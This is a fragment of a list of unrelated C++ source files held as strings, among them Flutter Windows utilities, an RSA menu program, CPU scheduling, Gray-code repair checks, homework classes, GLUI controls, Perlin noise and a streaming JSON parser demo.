::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"rsa_class/rsa.hpp\"\n#include \"main_include/prog.hpp\"\n#include <iostream>\n#include <cstdlib>\n#include <clocale>\n#include <ctime>\nconstexpr auto GERAR_CHAVES = 0;\nconstexpr auto CRIPTOGRAFAR = 1;\nconstexpr auto DECRIPTOGRAFAR = 2;\nconstexpr auto SAIR = 3;\n\nusing namespace std;\n\nint main(int argc, char* argv[])\n{\n    setlocale(LC_ALL,\"Portuguese\");\n    bool sair = false;\n\n    while (!sair)\n    {\n        string nome_arquivo_original, nome_arquivo_final;\n        long long int n, key;\n        short int option;\n\n        menu();\n        cin >> option;\n\n        if (cin.fail())\n        {\n            cout << \"Erro na entrada de valores!\\n\";\n            system(\"pause\");\n            exit(EXIT_FAILURE);\n        }\n        switch (option)\n        {\n            case GERAR_CHAVES:\n            {\n                gerar_chaves();\n            }\n            break;\n            case CRIPTOGRAFAR:\n            {\n                criptografar(key,n,nome_arquivo_original,nome_arquivo_final); \n            }\n            break;\n            case DECRIPTOGRAFAR:\n            {\n                decriptografar(key,n,nome_arquivo_original,nome_arquivo_final); \n            }\n            break;\n            case SAIR:\n            {\n                sair = true;\n                break;\n            }\n            default:\n            {\n                cout << \"Op\u00e7\u00e3o inv\u00e1lida. Tente novamente.\\n\\n\";\n            }\n            break;\n        }\n        system(\"pause\");\n        system(\"cls\");\n    }\n    return 0;\n}\n\n\n\n",
    "#include <iostream>\r\n#include <vector>\r\nusing namespace std;\r\n\r\nvoid findWaitingTime(int processes[], int n, int bt[], int wt[]) {\r\n    wt[0] = 0;\r\n    for (int i = 1; i < n; i++) {\r\n        wt[i] = bt[i - 1] + wt[i - 1];\r\n    }\r\n}\r\n\r\nvoid findturnAroundTime(int processes[], int n, int bt[], int wt[], int tat[]) {\r\n    for (int i = 0; i < n; i++) {\r\n        tat[i] = bt[i] + wt[i];\r\n    }\r\n}\r\n\r\nvoid findAverageTime(int processes[], int n, int burst_time[]) {\r\n    int wt[n], tat[n], total_wt = 0, total_tat = 0;\r\n    findWaitingTime(processes, n, burst_time, wt);\r\n    findturnAroundTime(processes, n, burst_time, wt, tat);\r\n    cout << \"Processes\\tBurst Time\\tWaiting Time\\tTurn Around Time\\n\";\r\n    for (int i = 0; i < n; i++) {\r\n        total_wt += wt[i];\r\n        total_tat += tat[i];\r\n        cout << \" \" << processes[i] << \"\\t\\t\" << burst_time[i] << \"\\t\\t\" << wt[i] << \"\\t\\t\" << tat[i] << endl;\r\n    }\r\n}\r\n\r\nint main() {\r\n    int processes[] = {1, 2, 3, 4};\r\n    int n = sizeof(processes) / sizeof(processes[0]);\r\n    int burst_time[] = {21, 3, 6, 2};\r\n    findAverageTime(processes, n, burst_time);\r\n    return 0;\r\n}",
    "#include <iostream>\n#include <bits/stdc++.h>\n#include \"Perm.h\"\nusing namespace std;\n/*\n2^9, 0 1 -> 00 01 11 10 -> 000 001 011 010 110 111 101 100\n3^5, 0 1 2 -> 00 01 02 12 11 10 20 21 22\n4^5, 0 1 2 3 -> 00 01 02 03 13 12 11 10 20 21 22 23 33 32 31 30\n\n\n3^5, k=12, m=3\n 0 (0,0)  IO:    1 -> 1   \n 1 (1,0)  IO:    1 -> 1   \n 2 (2,0)  IO:    1 -> 1   \n 3 (0,1)  IO:    3 -> 2   \n 4 (1,1)  IO:    3 -> 3   \n 5 (2,1)  IO:    3 -> 2   \n 6 (0,2)  IO:    9 -> 5   \n 7 (1,2)  IO:    9 -> 9   \n 8 (2,2)  IO:    9 -> 5   \n 9 (0,3)  IO:   27 -> 14  \n10 (1,3)  IO:   27 -> 27  \n11 (2,3)  IO:   27 -> 14  \n12 (0,4)  IO:   81 -> 41  \n13 (1,4)  IO:   81 -> 81  \n14 (2,4)  IO:   81 -> 41  \nAll-IO: 363 -> 247, reduce ratio: 31.956%\n\n4^5, k=16, m=4\n 0 (0,0)  IO:    1 -> 1   \n 1 (1,0)  IO:    1 -> 1   \n 2 (2,0)  IO:    1 -> 1   \n 3 (3,0)  IO:    1 -> 1   \n 4 (0,1)  IO:    4 -> 3   \n 5 (1,1)  IO:    4 -> 4   \n 6 (2,1)  IO:    4 -> 4   \n 7 (3,1)  IO:    4 -> 2   \n 8 (0,2)  IO:   16 -> 9   \n 9 (1,2)  IO:   16 -> 16  \n10 (2,2)  IO:   16 -> 16  \n11 (3,2)  IO:   16 -> 8   \n12 (0,3)  IO:   64 -> 33  \n13 (1,3)  IO:   64 -> 64  \n14 (2,3)  IO:   64 -> 64  \n15 (3,3)  IO:   64 -> 32  \n16 (0,4)  IO:  256 -> 129 \n17 (1,4)  IO:  256 -> 256 \n18 (2,4)  IO:  256 -> 256 \n19 (3,4)  IO:  256 -> 128 \nAll-IO: 1364 -> 1028, reduce ratio: 24.633%\n*/\n\nvector<int> to_plain(int value);\nbool check_gray(vector<int>& order);\nconst int BASE = 3;\nconst int DIGITS = 4;\n\nint main() {\n    vector<int> order;\n    for (int i=0; i<BASE; i++) {\n        order.push_back(i);\n    }\n    int a = 1, cur = 1;\n    while (cur<DIGITS) {\n        a *= BASE;\n        vector<int> next;\n        bool flag = true;\n        for (int i=0; i<BASE; i++) {\n            if (flag) {\n                for (int j=0; j<order.size(); j++) {\n                    next.push_back(i*a + order[j]);\n                }\n            } else {\n                for (int j=order.size()-1; j>=0; j--) {\n                    next.push_back(i*a + order[j]);\n                }\n            }\n            flag = !flag;\n        }\n        order = next;\n        cur++;\n    }\n\n    if (check_gray(order)) {\n        printf(\"Is gray code.\\n\");\n    } else {\n        perror(\"gray code error\");\n        exit(1);\n    }    \n\n    int m=BASE, k=BASE*DIGITS-m;\n    Perm perm(k,m);\n    perm.show_seq_io();\n    perm.show_diff_io(order);\n\n    vector<pair<int,int>> ind;\n    perm.order = order;\n    cout<<\"validate ind-----------\"<<endl;\n    for (int i=0; i<k+m; i++) {\n        ind.clear();\n        perm.get_repair_subchunks(i, ind, \"clay\");\n        printf(\"repair %d: \", i);\n        for (auto p : ind) {\n            printf(\"<%d,%d> \", p.first, p.second);\n        }\n        printf(\"\\n\");\n    }\n\n}\n\n\n\nvector<int> to_plain(int value) {\n    vector<int> v(DIGITS);\n    int i=0;\n    while (value) {\n        v[i] = value%BASE;\n        i++;\n        value /= BASE;\n    }\n    return v;\n}\nbool check_gray(vector<int>& order) {   // not cyclic\n    vector<int> v = to_plain(order[0]);\n    for (int i=1; i<order.size(); i++) {\n        vector<int> v2 = to_plain(order[i]);\n        int t=0;\n        for (int j=0; j<DIGITS; j++) {\n            if (v[j] != v2[j]) t++;\n        }\n        if (t>1) return false;\n        v = v2;\n    }\n    return true;\n}",
    "\ufeff// Homework01.04.2024-Classes.cpp : \u042d\u0442\u043e\u0442 \u0444\u0430\u0439\u043b \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0444\u0443\u043d\u043a\u0446\u0438\u044e \"main\". \u0417\u0434\u0435\u0441\u044c \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f \u0438 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b.\n//\n\n#include <iostream>\nusing namespace std;\n\nclass Dog \n{\npublic:\n    string name;\n    string color;\n    string bread;\n    string favorite_food;\n    double weight = 0;\n\n    void Bark()\n    {\n        cout << bread << name << \" : \" <<  \"GAV-GAV...\\n\";\n    }\n    void Growl()\n    {\n        cout << bread << name << \" : \" << \"R-R-R-R-R-R...\\n\";\n    }\n    void Walk()\n    {\n        cout << \" loves to walk in the park,\";\n    }\n    void Eat()\n    {\n        cout << bread << name << \" love eat \" << favorite_food << \".\\n\";\n    }\n    void Sleep()\n    {\n        cout <<  bread << name << \" went to sleep.\\n\";\n    }\n};\n\nclass PowerBank\n{\npublic:\n    string brand;\n    string color;\n    int quantity_ports = 0;\n    double capacity = 0;\n    bool Type_C = false;\n    bool USB = false;\n    bool Micro_USB = false;\n    bool charg = false;\n\n    void Charging()\n    {\n        if ((Type_C || Micro_USB) && !USB && charg)\n        {\n            cout << \"Power bank charge the device.\\n\";\n        }\n        else if (USB)\n        {\n            cout << \"Power bank charging.\\n\";\n        }\n    }\n    void  PowerBankInfo()\n    {\n        cout << \"Power Bank Info:\\n\";\n        cout << \"\\t\\tBrand: \" << brand << \"\\n\";\n        cout << \"\\t\\tColor: \" << color << \"\\n\";\n        cout << \"\\t\\tQuantity USB-ports: \" << quantity_ports << \"\\n\";\n        cout << \"\\t\\tCapacity: \" << capacity << \" mA/h\\n\";\n        if (Type_C)\n        {\n            cout << \"\\t\\tHave Type C-port \\n\";\n        }\n        if (Micro_USB)\n        {\n            cout << \"\\t\\tHave Micro USB-port \\n\";\n        }\n    }\n};\n\nclass Mouse\n{\npublic:\n    string brand;\n    string model;\n    string color;\n    bool wireless = false;\n    bool left_button = false;\n    bool right_button = false;\n    bool scrol = false;\n\n    void Press_left_button()\n    {\n        if (left_button)\n        {\n            cout << \"Perform an action.\\n\";\n        }\n        \n    }\n    void Press_right_button()\n    {\n        if (right_button)\n        {\n            cout << \"Show context menu.\\n\";\n        }\n    }\n    void Scrol()\n    {\n        if (scrol)\n        {\n            cout << \"Scroll....scrol...scrol...scrol...\\n\";\n        }\n    }\n    void MouseInfo()\n    {\n        cout << \"Mouse Info:\\n\";\n        cout << \"\\tBrand: \" << brand << \"\\n\";\n        cout << \"\\tModel: \" << model << \"\\n\";\n        cout << \"\\tColor: \" << color << \"\\n\";\n        if (wireless)\n        {\n            cout << \"\\tWired or wireless:  wireless.\\n\";\n        }\n        else\n        {\n            cout << \"\\tWired or wireless:  wired.\\n\";\n        }\n    }\n};\n\nclass TV\n{\npublic:\n    string brand;\n    string model;\n    double diagonal = 0;\n    string color;\n\n    void TVInfo() \n    {\n        cout << \"TV Info:\\n\";\n        cout << \"\\tBrand: \" << brand << \"\\n\";\n        cout << \"\\tModel: \" << model << \"\\n\";\n        cout << \"\\tDiagonal: \" << diagonal << \" inches\" << \"\\n\";\n        cout << \"\\tColor: \" << color << \"\\n\";\n    }\n    void TV_On() \n    {\n        cout << \"The TV turns on...\\n\";\n    }\n\n    void TV_Off() \n    {\n        cout << \"The TV turns off\\n\";\n    }\n\n    void changeChannel(int channel) \n    {\n        cout << \"Changing channel to \" << channel << \"\\n\";\n    }\n\n};\n\nclass Automobile\n{\npublic: \n    string brand;\n    string model;\n    string equipment;\n    string engine_type;\n    double engine_volume = 0;\n    string fuel;\n    string transmision;\n    double power = 0;\n    int wheel_drive = 0;\n\n    void CarInfo()\n    {\n        cout << \"Car Information:\\n\";\n        cout << \"\\t\\tCar brand: \" << brand << \"\\n\";\n        cout << \"\\t\\tModel: \" << model << \"\\n\";\n        cout << \"\\t\\tCar equipment: \" << equipment << \"\\n\";\n        cout << \"\\t\\tEngine type: \" << engine_type << \"\\n\";\n        cout << \"\\t\\tEngine volume: \" << engine_volume << \" sm3\\n\";\n        cout << \"\\t\\tFuel: \" << fuel << \"\\n\";\n        cout << \"\\t\\tTransmision: \" << transmision << \"\\n\";\n        cout << \"\\t\\tEngine power: \" << power << \" hp\\n\";\n        cout << \"\\t\\tWheel drive: \" << wheel_drive << \" wheels\\n\";\n    }\n\n};\n\nclass Sosed\n{\npublic:\n    string name;\n    string shoes;\n    string tool;\n    bool sleeping = false;\n    string mental_condition;\n\n    void Never_sleep()\n    {\n        cout << \"A-HA-HA!!! NO, NO, NO\\n\";\n    }\n    void About_myself()\n    {\n        cout << \"My name is \" << name << \", i am a \" << mental_condition << \" And i have a \" << tool << \"\\n\";\n    }\n    void Work()\n    {\n        cout << \"I'll put my on now \" << shoes << \" and take my \" << tool << \"\\n\";\n        cout << \"I urgently need to do something. NOW!\\n\";\n    }\n};\n\nint main()\n{\n  //////////////////////////////////////////////////////////////////////////                  DOG                    ///////////////////////////////////////////////////////////////// \n    Dog dog;\n\n    dog.name = \"Benya\";\n    dog.favorite_food = \"meat\";\n    dog.bread = \"Pikines \";\n    dog.weight = 6;\n    dog.color = \"beige\";\n    \n    cout << dog.name",
    "/****************************************************************************\n\n  GLUI User Interface Toolkit\n  ---------------------------\n\n     glui_mouse_iaction - GLUI Mouse Interaction control class\n\n\n          --------------------------------------------------\n\n  Copyright (c) 1998 Paul Rademacher\n\n  WWW:    http://sourceforge.net/projects/glui/\n  Forums: http://sourceforge.net/forum/?group_id=92496\n\n  This software is provided 'as-is', without any express or implied\n  warranty. In no event will the authors be held liable for any damages\n  arising from the use of this software.\n\n  Permission is granted to anyone to use this software for any purpose,\n  including commercial applications, and to alter it and redistribute it\n  freely, subject to the following restrictions:\n\n  1. The origin of this software must not be misrepresented; you must not\n  claim that you wrote the original software. If you use this software\n  in a product, an acknowledgment in the product documentation would be\n  appreciated but is not required.\n  2. Altered source versions must be plainly marked as such, and must not be\n  misrepresented as being the original software.\n  3. This notice may not be removed or altered from any source distribution.\n\n*****************************************************************************/\n\n#include \"glui/glui_internal_control.h\"\n\n/********************** GLUI_Mouse_Interaction::mouse_down_handler() ******/\n\nint    GLUI_Mouse_Interaction::mouse_down_handler( int local_x, int local_y )\n{\n  /* int win_h = glutGet( GLUT_WINDOW_HEIGHT ); */\n\n  /*\tiaction_mouse_down_handler( local_x, local_y );              */\n  iaction_mouse_down_handler( local_x-x_abs, local_y-y_abs );\n  /*local_x-x_abs, ((glui->h-local_y)-y_abs) );              */\n  redraw();\n\n  return false;\n}\n\n\n/**************************** GLUI_Mouse_Interaction::mouse_up_handler() */\n\nint    GLUI_Mouse_Interaction::mouse_up_handler( int local_x, int local_y, bool inside )\n{\n  iaction_mouse_up_handler( local_x-x_abs, local_y-y_abs, inside );\n  return false;\n}\n\n\n/****************************** GLUI_Mouse_Interaction::mouse_held_down_handler() ******/\n\nint    GLUI_Mouse_Interaction::mouse_held_down_handler( int local_x, int local_y,\n\t\t\t\t\t\t\tbool inside)\n{\n  iaction_mouse_held_down_handler( local_x-x_abs, local_y-y_abs , inside );\n\n  redraw();\n\n  /** Tell the main graphics window to update iteself **/\n  if( glui )\n    glui->post_update_main_gfx();\n\n  execute_callback();\n\n  return false;\n}\n\n\n\n/****************************** GLUI_Mouse_Interaction::draw() **********/\n\nvoid    GLUI_Mouse_Interaction::draw( int x, int y )\n{\n  GLUI_DRAWINGSENTINAL_IDIOM\n  int text_width\t= string_width( this->name );\n  int x_left\t\t\t= this->w/2 - text_width/2;\n\n  if ( NOT draw_active_area_only ) {\n    draw_name( x_left, h-4 );\n    draw_active_box( x_left-4, x_left+string_width( name )+4,\n\t\t     h, h-14 );\n  }\n\n  draw_active_area();\n}\n\n\n/************************************ GLUI_Mouse_Interaction::update_size() **********/\n\nvoid   GLUI_Mouse_Interaction::update_size( void )\n{\n  if ( NOT glui )\n    return;\n\n  int text_width = string_width( this->name );\n\n  if ( w < text_width+6 )\n    w = text_width+6;\n\n  if ( h - 18 > w )\n    w = h - 18;\n\n  iaction_init();\n}\n\n\n/****************************** GLUI_Mouse_Interaction::special_handler() **********/\n\nint    GLUI_Mouse_Interaction::special_handler( int key,int modifiers )\n{\n  int center_x, center_y;\n  int drag_x, drag_y;\n\n  center_x = w/2;\n  center_y = (h-18)/2;\n  drag_x   = 0;\n  drag_y   = 0;\n\n  if ( key == GLUT_KEY_LEFT )\n    drag_x = -6;\n  else if ( key == GLUT_KEY_RIGHT )\n    drag_x = 6;\n  else if ( key == GLUT_KEY_UP )\n    drag_y = -6;\n  else if ( key == GLUT_KEY_DOWN )\n    drag_y = 6;\n\n  if ( drag_x != 0 OR drag_y != 0 ) {\n    mouse_down_handler( center_x, center_y );\n    mouse_held_down_handler( center_x + drag_x, center_y + drag_y,true );\n    mouse_up_handler( center_x + drag_x, center_y + drag_y, true );\n  }\n\n  return false;\n}\n\n\n/****************************** GLUI_Mouse_Interaction::draw_active_area() **********/\n\nvoid    GLUI_Mouse_Interaction::draw_active_area( void )\n{\n  int win_h = glutGet( GLUT_WINDOW_HEIGHT ), win_w = glutGet(GLUT_WINDOW_WIDTH);\n\n  int text_height = 18; /* what a kludge              */\n\n  int viewport_size = h-text_height;  /*MIN(w,h);              */\n\n  glMatrixMode( GL_MODELVIEW );\n  glPushMatrix();\n  glLoadIdentity();\n  glTranslatef( (float) win_w/2.0, (float) win_h/2.0, 0.0 );\n  glRotatef( 180.0, 0.0, 1.0, 0.0 );\n  glRotatef( 180.0, 0.0, 0.0, 1.0 );\n  glTranslatef( (float) -win_w/2.0, (float) -win_h/2.0, 0.0 );\n\n  glTranslatef( (float) this->x_abs + .5, (float) this->y_abs + .5, 0.0 );\n\n  glTranslatef( (float)this->w/2.0, (float)viewport_size/2.0 + 2.0 , 0.0  );\n\n  /***   Draw the interaction control's orthographic elements   ***/\n  iaction_draw_active_area_ortho();\n\n  /***   Setup and draw the interaction control's perspective elements   ***/\n\n  /***  Set the viewport to just the square of the d",
    "#define _USE_MATH_DEFINES\n#include <SFML/Graphics.hpp>\n#include <cmath>\n#include <vector>\n#include <algorithm>\n#include <random>\n#include <iostream>\n\nusing namespace std;\n\nclass Vector2 {\npublic:\n    float x, y;\n\n    Vector2(float _x, float _y) : x(_x), y(_y) {}\n\n    float dot(const Vector2& other) const {\n        return x * other.x + y * other.y;\n    }\n};\n\n// Fisher-Yates \uc54c\uace0\ub9ac\uc998.\nvoid Shuffle(std::vector<int>& arrayToShuffle) {\n    std::random_device rd;\n    std::mt19937 g(rd());\n\n    for (int e = arrayToShuffle.size() - 1; e > 0; e--) {\n        std::uniform_int_distribution<int> distribution(0, e - 1);\n        int index = distribution(g);\n\n        std::swap(arrayToShuffle[e], arrayToShuffle[index]);\n    }\n}\n\n// \ubbf8\ub9ac \ub9cc\ub4e0 \uc218\uc5f4\uc744 \uc0ac\uc6a9\ud55c\ub2e4. 0 - \nstd::vector<int> MakePermutation() {\n    std::vector<int> permutation;\n    for (int i = 0; i < 256; i++) {\n        permutation.push_back(i);\n    }\n\n    Shuffle(permutation);\n\n    for (int i = 0; i < 256; i++) {\n        permutation.push_back(permutation[i]);\n    }\n\n    return permutation;\n}\n\nconst std::vector<int> Permutation = MakePermutation();\n\nVector2 GetGradientVector(int v) {\n    int h = v & 3;\n    if (h == 0)\n        return Vector2(1.0f, 1.0f);\n    else if (h == 1)\n        return Vector2(-1.0f, 1.0f);\n    else if (h == 2)\n        return Vector2(-1.0f, -1.0f);\n    else\n        return Vector2(1.0f, -1.0f);\n}\n\nfloat Fade(float t) {\n    return ((6 * t - 15) * t + 10) * t * t * t;\n}\n\nfloat Lerp(float t, float a1, float a2) {\n    return a1 + t * (a2 - a1);\n}\n\nfloat Noise2D(float x, float y) {\n    // 1. \uac01 x, y \uc2e4\uc218\ub97c \uc785\ub825\uc73c\ub85c \ub450\uc5c8\uc744 \ub54c, \ud53d\uc140\ub4e4\uc740 \uc815\uc218 \uadf8\ub9ac\ub4dc\uc5d0 \uc874\uc7ac\ud569\ub2c8\ub2e4.\n\n    int X = static_cast<int>(std::floor(x)) & 255;\n    int Y = static_cast<int>(std::floor(y)) & 255;\n\n    // 1. \uc18c\uc218\ubd80\ub9cc \ub0a8\uae30\uac8c \ud569\ub2c8\ub2e4.\n    float xf = x - std::floor(x);\n    float yf = y - std::floor(y);\n\n    // 2. \ud574\ub2f9 \uc815\uc0ac\uac01\ud615 \uadf8\ub9ac\ub4dc \uac01 \uaf2d\uc9d3\uc810\uc5d0 \uadf8\ub798\ub514\uc5b8\ud2b8(\uae30\uc6b8\uae30) \ubca1\ud130\ub97c \ud560\ub2f9\ud569\ub2c8\ub2e4.\n    // 2-1. Ken Perlin \uc774 \uc81c\uc548\ud55c \uc21c\uc5f4\uc774 \uc874\uc7ac\ud569\ub2c8\ub2e4.\n    // 2-2. \uc21c\uc5f4\uc5d0\uc11c \uac12\uc744 \uac00\uc838\uc635\ub2c8\ub2e4. \uac01 \ubaa8\uc11c\ub9ac\ub4e4\uc5d0\uac8c \uc21c\uc5f4\uc758 \uac12\uc744 \ud560\ub2f9\ud569\ub2c8\ub2e4.\n    int valueTopRight = Permutation[Permutation[X + 1] + Y + 1];\n    int valueTopLeft = Permutation[Permutation[X] + Y + 1];\n    int valueBottomRight = Permutation[Permutation[X + 1] + Y];\n    int valueBottomLeft = Permutation[Permutation[X] + Y];\n\n    // 3. \uac01 \ubaa8\uc11c\ub9ac\uc810\uc5d0\uc11c \uc785\ub825 \uc810\uae4c\uc9c0\uc758 \uac70\ub9ac \ubca1\ud130\ub97c \uad6c\ud569\ub2c8\ub2e4.\n    Vector2 topRight(xf - 1.0f, yf - 1.0f);\n    Vector2 topLeft(xf, yf - 1.0f);\n    Vector2 bottomRight(xf - 1.0f, yf);\n    Vector2 bottomLeft(xf, yf);\n\n    // 4. \uac01 \ubaa8\uc11c\ub9ac \uc810\uc758 \uc624\ud504\uc14b \ubca1\ud130(\uc785\ub825 \uc810\uae4c\uc9c0\uc758 \uac70\ub9ac \ubca1\ud130) \uacfc \ubaa8\uc11c\ub9ac \uc810\uc758 \uae30\uc6b8\uae30\ub97c \ub0b4\uc801\ud569\ub2c8\ub2e4. \uadf8\ub798\ub514\uc5b8\ud2b8 \ubca1\ud130\uc758 \uc601\ud5a5\ub825\uc740 \uac70\ub9ac\uc5d0 \ub530\ub77c \ucee4\uc9d1\ub2c8\ub2e4.\n    float dotTopRight = topRight.dot(GetGradientVector(valueTopRight));\n    float dotTopLeft = topLeft.dot(GetGradientVector(valueTopLeft));\n    float dotBottomRight = bottomRight.dot(GetGradientVector(valueBottomRight));\n    float dotBottomLeft = bottomLeft.dot(GetGradientVector(valueBottomLeft));\n\n    // 5. \ubd80\ub4dc\ub7ec\uc6b4 \ubcf4\uac04(smooth interpolation)\uc744 \uc704\ud574 \uc0ac\uc6a9\ub429\ub2c8\ub2e4. \n    // \uc774 \ud568\uc218\ub294 \uc785\ub825 \uac12 t\ub97c 0\uc5d0\uc11c 1 \uc0ac\uc774\uc758 \uac12\uc73c\ub85c \ub9e4\ud551\ud558\uba70, \ub2e4\ud56d\uc2dd \uace1\uc120\uc744 \ub530\ub77c \ubcc0\ud654\ud569\ub2c8\ub2e4.\n    float u = Fade(xf);\n    float v = Fade(yf);\n\n    // 6. \ub0b4\uc801\ud55c \uac12\ub4e4\uc744 \ud63c\ud569\ud558\uc5ec \ub2e8\uc77c\uc758 \uac12\uc73c\ub85c \ub9cc\ub4ed\ub2c8\ub2e4. \n    float result = Lerp(v,\n        Lerp(u, dotBottomLeft, dotBottomRight), Lerp(u, dotTopLeft, dotTopRight));\n\n    return result;\n}\n\nfloat FractalBrownianMotion(float x, float y, int numOctaves) {\n    float result = 0.0f;\n    float amplitude = 1.0f;\n    float frequency = 0.005f;\n    float persistence = 0.5f;\n\n    for (int octave = 0; octave < numOctaves; octave++) {\n        float n = amplitude * Noise2D(x * frequency, y * frequency);\n        result += n;\n\n        amplitude *= persistence; \n        frequency *= 2.0f;\n    }\n\n    result = std::max(-1.0f, std::min(1.0f, result));\n\n    return result;\n}\n\nint main() {\n    const int windowWidth = 800;\n    const int windowHeight = 600;\n    const int numOctaves = 8;\n\n    sf::RenderWindow window(sf::VideoMode(windowWidth, windowHeight), \"Perlin Noise\");\n\n    sf::Image textureImage;\n    textureImage.create(windowWidth, windowHeight);\n\n    for (int y = 0; y < windowHeight; y++) {\n        for (int x = 0; x < windowWidth; x++) {\n            float persistence = 0.5f;\n            float frequency = 0.01f;\n            //float n = Noise2D(x * frequency, y * frequency);\n            //float value = n;\n            float value = FractalBrownianMotion(static_cast<float>(x), static_cast<float>(y), numOctaves);\n            value = (value + 1.0f) / 2.0f; // Normalize to [0, 1]\n\n            sf::Color color(static_cast<sf::Uint8>(255 * value), static_cast<sf::Uint8>(255 * value), static_cast<sf::Uint8>(255 * value));\n            textureImage.setPixel(x, y, color);\n        }\n    }\n\n    sf::Texture texture;\n    texture.loadFromImage(textureImage);\n    sf::Sprite sprite(texture);\n\n    while (window.isOpen()) {\n        sf::Event event;\n        while (window.pollEvent(event)) {\n            if (event.type == sf::Event::Closed)\n                window.close();\n        }\n\n        window.clear();\n        window.draw(sprite);\n        window.display();\n    }\n\n    return 0;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "\n#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n\n#include <streamjson.hpp>\n\nconst std::string json = \" \\\n{ \\\"owners\\\": [ \\\n        {   \\\n            \\\"name\\\": \\\"John\\\", \\\n            \\\"age\\\": 30, \\\n            \\\"owner\\\": False, \\\n            \\\"cars\\\":  [ \\\n                \\\"name\\\": \\\"Ford\\\", \\\n                \\\"name\\\": \\\"BMW\\\", \\\n            ] \\\n        }, \\\n        {   \\\n            \\\"name\\\": \\\"Jane\\\", \\\n            \\\"age\\\": 25, \\\n            \\\"owner\\\": True, \\\n            \\\"cars\\\":  [ \\\n                \\\"name\\\": \\\"Audi\\\", \\\n                \\\"name\\\": \\\"Mercedes\\\" \\\n                \\\"name\\\": \\\"Fiat\\\" \\\n            ] \\\n        } \\\n    ] \\\n}\";\n\nint main(int argc, char* argv[] )\n{\n    std::string name;\n\n    streamjson::FilterListener<\"owners\\\\[[0-9]+\\\\]\\\\.name\"> name_filter([&](const std::string_view & key, const streamjson::JSONValue & value, const std::vector<size_t> & indexes)\n    {\n        name = value.to_string();\n    });\n\n\n    streamjson::FilterListener<\"owners\\\\[[0-9]+\\\\]\\\\.cars\\\\[[0-9]+\\\\]\\\\.name\"> car_filter([&](const std::string_view & key, const streamjson::JSONValue & value, const std::vector<size_t> & indexes)\n    {\n        std::cout << name << \" has a \" << value.to_string() << std::endl;\n    });\n\n    streamjson::FilterListener<\".*\"> all_filter([&](const std::string_view & key, const streamjson::JSONValue & value, const std::vector<size_t> & indexes)\n    {\n        std::cout << key << \" : \" << value.to_string() << std::endl;\n    });\n\n    streamjson::MultiListener multi_filter({&name_filter, &car_filter, &all_filter});\n\n    // Feed the file by chunks\n    constexpr size_t BUFFER_SIZE = 300;\n    streamjson::AutofeedStreamJson<BUFFER_SIZE> chunk_parser(multi_filter);\n\n    constexpr size_t CHUNK_SIZE = 10;\n    const char * ptr = json.data();\n    while (ptr < (json.data() + json.size()))\n    {\n        size_t actual_size = std::min(CHUNK_SIZE, json.size() - (ptr - json.data()));\n        chunk_parser.feed(ptr, actual_size);\n        ptr += actual_size;\n    }\n\n    return 0;\n}\n",
